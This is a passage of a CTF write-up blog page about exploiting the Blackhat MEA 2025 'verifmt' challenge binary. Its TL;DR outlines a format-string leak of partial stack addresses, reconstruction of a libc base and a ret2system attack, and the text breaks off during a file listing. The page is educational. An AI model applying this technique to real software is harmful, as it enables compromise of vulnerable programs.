<!DOCTYPE html><html class="bg-background text-foreground scheme-light-dark" lang="en-US"> <head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><meta name="generator" content="Astro v5.8.0"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: light)"><link rel="sitemap" href="/sitemap-index.xml"><link rel="manifest" href="/site.webmanifest"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/other-files/ClientRouter.astro_astro_type_script_index_0_lang.CtSceO8m.js"></script><title>Blackhat MEA CTF Final 2025 – pwn/verifmt | z0v3r1n&#39;s blog</title><meta name="title" content="Blackhat MEA CTF Final 2025 – pwn/verifmt | z0v3r1n's blog"><link rel="canonical" href="https://z0v3r1n.github.io"><meta property="og:title" content="Blackhat MEA CTF Final 2025 – pwn/verifmt"><meta property="og:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta property="og:image:alt" content="Blackhat MEA CTF Final 2025 – pwn/verifmt"><meta property="og:type" content="website"><meta property="og:locale" content="en-US"><meta property="og:site_name" content="z0v3r1n's blog"><meta property="og:url" content="https://z0v3r1n.github.io/blog/blackhat-mea-2025_verifmt/"><meta name="twitter:title" content="Blackhat MEA CTF Final 2025 – pwn/verifmt"><meta property="twitter:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta name="twitter:image:alt" content="Blackhat MEA CTF Final 2025 – pwn/verifmt"><meta name="twitter:card" content="summary_large_image"><meta property="article:tag" content="pwn"><meta property="article:tag" content="blackhat-mea"><link rel="stylesheet" href="/other-files/about.DQPP2Tja.css"></head><body class="flex h-fit min-h-screen flex-col gap-y-6 font-sans"> <header class="bg-background/50 sticky top-0 z-50 divide-y backdrop-blur-sm xl:divide-none"> <div> <div class="mx-auto flex max-w-3xl items-center justify-between gap-4 px-4 py-3"> <a href="/" target="_self" class="transition-colors duration-300 ease-in-out flex shrink-0 items-center justify-center gap-3">  <span class="hidden h-full text-lg leading-none font-medium min-[400px]:block">z0v3r1n&#39;s blog</span>  </a> <div class="flex items-center gap-4"> <nav class="flex items-center gap-4 text-sm sm:gap-6"> <a href="/blog" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> blog/
 </a><a href="/about" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> about/
 </a> </nav> <button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-muted hover:text-foreground dark:hover:bg-muted/50 -my-2 -me-2 size-8" id="theme-toggle" title="Toggle theme"> <svg width="1em" height="1em" class="size-4 dark:hidden" data-icon="lucide:sun">   <symbol id="ai:lucide:sun" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></g></symbol><use href="#ai:lucide:sun"></use>  </svg> <svg width="1em" height="1em" class="absolute hidden size-4 dark:block" data-icon="lucide:moon">   <symbol id="ai:lucide:moon" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3a6 6 0 0 0 9 9a9 9 0 1 1-9-9"/></symbol><use href="#ai:lucide:moon"></use>  </svg> <span class="sr-only">Toggle theme</span> </button> <script data-astro-rerun>
  (() => {
    const theme = (() => {
      const stored = localStorage?.getItem('theme') ?? ''
      if (['dark', 'light'].includes(stored)) return stored
      return window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
    })()

    document.documentElement.setAttribute('data-theme', theme)
    window.localStorage.setItem('theme', theme)
  })()
</script> <script type="module">function a(){const e=document.documentElement,n=e.getAttribute("data-theme")==="dark"?"light":"dark";e.classList.add("[&_*]:transition-none"),e.setAttribute("data-theme",n),window.getComputedStyle(e).getPropertyValue("opacity"),requestAnimationFrame(()=>{e.classList.remove("[&_*]:transition-none")}),localStorage.setItem("theme",n)}function o(){document.getElementById("theme-toggle")?.addEventListener("click",a)}o();document.addEventListener("astro:after-swap",()=>{const e=localStorage.getItem("theme")||"light",t=document.documentElement;t.classList.add("[&_*]:transition-none"),window.getComputedStyle(t).getPropertyValue("opacity"),t.setAttribute("data-theme",e),requestAnimationFrame(()=>{t.classList.remove("[&_*]:transition-none")}),o()});</script> </div> </div> </div>  <div id="mobile-toc-container" class="w-full xl:hidden"><details class="group"><summary class="flex w-full cursor-pointer items-center justify-between"><div class="mx-auto flex w-full max-w-3xl items-center px-4 py-3"><div class="relative mr-2 size-4"><svg class="h-4 w-4" viewBox="0 0 24 24"><circle class="text-primary/20" cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"></circle><circle id="mobile-toc-progress-circle" class="text-primary" cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2" stroke-dasharray="62.83" stroke-dashoffset="62.83" transform="rotate(-90 12 12)"></circle></svg></div><span id="mobile-toc-current-section" class="text-muted-foreground flex-grow truncate text-sm">
Overview
</span><span class="text-muted-foreground ml-2"><svg width="1em" height="1em" class="h-4 w-4 transition-transform duration-200 group-open:rotate-180" data-icon="lucide:chevron-down">   <symbol id="ai:lucide:chevron-down" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m6 9l6 6l6-6"/></symbol><use href="#ai:lucide:chevron-down"></use>  </svg></span></div></summary><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();;(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="Z1fLTnY" prefix="r4" component-url="/other-files/scroll-area.C86c4as2.js" component-export="ScrollArea" renderer-url="/other-files/client.ekDkyiUY.js" props="{&quot;className&quot;:[0,&quot;mx-auto max-w-3xl&quot;],&quot;data-toc-header-scroll&quot;:[0,true]}" ssr client="load" opts="{&quot;name&quot;:&quot;ScrollArea&quot;,&quot;value&quot;:true}" await-children><div dir="ltr" data-slot="scroll-area" class="relative mx-auto max-w-3xl" data-toc-header-scroll="true" style="position:relative;--radix-scroll-area-corner-width:0px;--radix-scroll-area-corner-height:0px"><style>[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}</style><div data-radix-scroll-area-viewport="" data-slot="scroll-area-viewport" class="ring-ring/10 dark:ring-ring/20 dark:outline-ring/40 outline-ring/50 size-full rounded-[inherit] transition-[color,box-shadow] focus-visible:ring-4 focus-visible:outline-1" style="overflow-x:hidden;overflow-y:hidden"><div style="min-width:100%;display:table"><astro-slot><div class="max-h-[30vh]"><ul class="flex list-none flex-col gap-y-2 px-4 pb-4" id="mobile-table-of-contents"><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#tldr" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="tldr">TL;DR</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#examining-the-provided-files" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="examining-the-provided-files">Examining the provided files</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#patching-the-binary" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="patching-the-binary">Patching the binary</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#examining-the-source-code" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="examining-the-source-code">Examining the source code</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#exploitation" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="exploitation">Exploitation</a></li><li class="px-4 text-sm ml-4 text-foreground/60"><a href="#conclusion" class="mobile-toc-item underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-id="conclusion">Conclusion</a></li></ul></div></astro-slot></div></div></div><!--astro:end--></astro-island></details></div><script type="module" src="/other-files/TOCHeader.astro_astro_type_script_index_0_lang.CKMLAwWj.js"></script> </header> <main class="w-full mx-auto flex grow flex-col gap-y-6 px-4">   <section class="grid grid-cols-[minmax(0px,1fr)_min(calc(var(--breakpoint-md)-2rem),100%)_minmax(0px,1fr)] gap-y-6">  <section class="col-start-2 flex flex-col gap-y-6 text-center"> <div class="flex flex-col"> <h1 class="mb-2 scroll-mt-31 text-3xl leading-tight font-medium sm:text-4xl" id="post-title"> Blackhat MEA CTF Final 2025 – pwn/verifmt </h1> <div class="text-muted-foreground divide-border mb-4 flex flex-col items-center justify-center divide-y text-xs sm:flex-row sm:flex-wrap sm:divide-x sm:divide-y-0 sm:text-sm"> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span>December 2, 2025</span> </div> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span> 10 min read  </span> </div>  </div> <div class="flex flex-wrap justify-center gap-2"> <a href="/tags/pwn" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" class="size-3" data-icon="lucide:hash">   <symbol id="ai:lucide:hash" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 9h16M4 15h16M10 3L8 21m8-18l-2 18"/></symbol><use href="#ai:lucide:hash"></use>  </svg> pwn </a><a href="/tags/blackhat-mea" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" viewBox="0 0 24 24" class="size-3" data-icon="lucide:hash">   <use href="#ai:lucide:hash"></use>  </svg> blackhat-mea </a> </div> </div> <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/buckeye-2025_bashtille#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <symbol id="ai:lucide:arrow-left" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m12 19l-7-7l7-7m7 7H5"/></symbol><use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Buckeye 2025 – pwn/bashtille </span> </div>  </a>  <a href="#" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full pointer-events-none opacity-50 cursor-not-allowed" aria-disabled="true">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> You&#39;re at the newest post! </span> </div> <svg width="1em" height="1em" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <symbol id="ai:lucide:arrow-right" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7-7l7 7l-7 7"/></symbol><use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <div id="toc-sidebar-container" class="sticky top-20 col-start-1 row-span-1 mr-8 ml-auto hidden h-[calc(100vh-5rem)] max-w-md xl:block"><astro-island uid="ZIdxrz" prefix="r6" component-url="/other-files/scroll-area.C86c4as2.js" component-export="ScrollArea" renderer-url="/other-files/client.ekDkyiUY.js" props="{&quot;className&quot;:[0,&quot;flex max-h-[calc(100vh-8rem)] flex-col overflow-y-auto&quot;],&quot;type&quot;:[0,&quot;hover&quot;],&quot;data-toc-scroll-area&quot;:[0,true]}" ssr client="load" opts="{&quot;name&quot;:&quot;ScrollArea&quot;,&quot;value&quot;:true}" await-children><div dir="ltr" data-slot="scroll-area" class="relative flex max-h-[calc(100vh-8rem)] flex-col overflow-y-auto" data-toc-scroll-area="true" style="position:relative;--radix-scroll-area-corner-width:0px;--radix-scroll-area-corner-height:0px"><style>[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}</style><div data-radix-scroll-area-viewport="" data-slot="scroll-area-viewport" class="ring-ring/10 dark:ring-ring/20 dark:outline-ring/40 outline-ring/50 size-full rounded-[inherit] transition-[color,box-shadow] focus-visible:ring-4 focus-visible:outline-1" style="overflow-x:hidden;overflow-y:hidden"><div style="min-width:100%;display:table"><astro-slot><div class="flex flex-col gap-2 px-4"><span class="text-lg font-medium">Table of Contents</span><ul class="flex list-none flex-col gap-y-2"><li class="text-sm ml-4 text-foreground/60"><a href="#tldr" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="tldr">TL;DR</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#examining-the-provided-files" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="examining-the-provided-files">Examining the provided files</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#patching-the-binary" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="patching-the-binary">Patching the binary</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#examining-the-source-code" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="examining-the-source-code">Examining the source code</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#exploitation" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="exploitation">Exploitation</a></li><li class="text-sm ml-4 text-foreground/60"><a href="#conclusion" class="marker:text-foreground/30 list-none underline decoration-transparent underline-offset-[3px] transition-colors duration-200 hover:decoration-inherit" data-heading-link="conclusion">Conclusion</a></li></ul></div></astro-slot></div></div></div><!--astro:end--></astro-island></div><script type="module">class f{links=document.querySelectorAll("[data-heading-link]");activeIds=[];headings=[];regions=[];scrollArea=null;tocScrollArea=null;reset(){this.links=document.querySelectorAll("#toc-sidebar-container [data-heading-link]"),this.activeIds=[],this.headings=[],this.regions=[];const t=document.getElementById("toc-sidebar-container");this.scrollArea=t?.querySelector("[data-radix-scroll-area-viewport]")||null,this.tocScrollArea=t?.querySelector("[data-toc-scroll-area]")||null}}const e=new f;class c{static build(){if(e.headings=Array.from(document.querySelectorAll(".prose h2, .prose h3, .prose h4, .prose h5, .prose h6")),e.headings.length===0){e.regions=[];return}e.regions=e.headings.map((t,o)=>{const i=e.headings[o+1];return{id:t.id,start:t.offsetTop,end:i?i.offsetTop:document.body.scrollHeight}})}static getVisibleIds(){if(e.headings.length===0)return[];const t=window.scrollY+150,o=window.scrollY+window.innerHeight,i=new Set,l=(s,r)=>s>=t&&s<=o||r>=t&&r<=o||s<=t&&r>=o;return e.headings.forEach(s=>{const r=s.offsetTop+s.offsetHeight;l(s.offsetTop,r)&&i.add(s.id)}),e.regions.forEach(s=>{if(s.start<=o&&s.end>=t){const r=document.getElementById(s.id);if(r){const a=r.offsetTop+r.offsetHeight;s.end>a&&(a<o||t<s.end)&&i.add(s.id)}}}),Array.from(i)}}class h{static update(){if(!e.scrollArea||!e.tocScrollArea)return;const{scrollTop:t,scrollHeight:o,clientHeight:i}=e.scrollArea,l=5,s=t<=l,r=t>=o-i-l;e.tocScrollArea.classList.toggle("mask-t-from-90%",!s),e.tocScrollArea.classList.toggle("mask-b-from-90%",!r)}}class g{static update(t){e.links.forEach(o=>{o.classList.remove("text-foreground")}),t.forEach(o=>{if(o){const i=document.querySelector(`#toc-sidebar-container [data-heading-link="${o}"]`);i&&i.classList.add("text-foreground")}}),this.scrollToActive(t)}static scrollToActive(t){if(!e.scrollArea||!t.length)return;const o=document.querySelector(`#toc-sidebar-container [data-heading-link="${t[0]}"]`);if(!o)return;const{top:i,height:l}=e.scrollArea.getBoundingClientRect(),{top:s,height:r}=o.getBoundingClientRect(),a=s-i+e.scrollArea.scrollTop,u=Math.max(0,Math.min(a-(l-r)/2,e.scrollArea.scrollHeight-e.scrollArea.clientHeight));Math.abs(u-e.scrollArea.scrollTop)>5&&(e.scrollArea.scrollTop=u)}}class d{static handleScroll(){const t=c.getVisibleIds();JSON.stringify(t)!==JSON.stringify(e.activeIds)&&(e.activeIds=t,g.update(e.activeIds))}static handleTOCScroll=()=>h.update();static handleResize(){c.build();const t=c.getVisibleIds();JSON.stringify(t)!==JSON.stringify(e.activeIds)&&(e.activeIds=t,g.update(e.activeIds)),h.update()}static init(){if(e.reset(),c.build(),e.headings.length===0){g.update([]);return}this.handleScroll(),setTimeout(h.update,100);const t={passive:!0};window.addEventListener("scroll",this.handleScroll,t),window.addEventListener("resize",this.handleResize,t),e.scrollArea?.addEventListener("scroll",this.handleTOCScroll,t)}static cleanup(){window.removeEventListener("scroll",this.handleScroll),window.removeEventListener("resize",this.handleResize),e.scrollArea?.removeEventListener("scroll",this.handleTOCScroll),Object.assign(e,{activeIds:[],headings:[],regions:[],scrollArea:null,tocScrollArea:null})}}document.addEventListener("astro:page-load",()=>d.init());document.addEventListener("astro:after-swap",()=>{d.cleanup(),d.init()});document.addEventListener("astro:before-swap",()=>d.cleanup());</script> <article class="prose col-start-2 max-w-none"> <h3 id="tldr">TL;DR</h3>
<p>You can use partial format strings (<code>%*N$</code>) to leak the lower 32 bits of stack values at arbitrary positions. Since only one nibble varies in the upper 32 bits of stack addresses (1/16 chance), we can reliably reconstruct full 64-bit addresses from the partial leak and use that to leak libc base, then do ret2system.</p>
<h3 id="examining-the-provided-files">Examining the provided files</h3>
<p>Looking at the provided files we have the challenge binary, it’s source code and some docker config files.</p>
<div class="expressive-code"><link rel="stylesheet" href="/other-files/ec.jdn72.css"/><script type="module" src="/other-files/ec.8zarh.js"></script><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:53ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ls</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">-la</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">total</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">40</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">drwxrwxr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">4096</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">07:23</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">.</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">drwxrwxr-x</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">4096</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">07:22</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">16440</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">117</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">compose.yml</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">337</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> 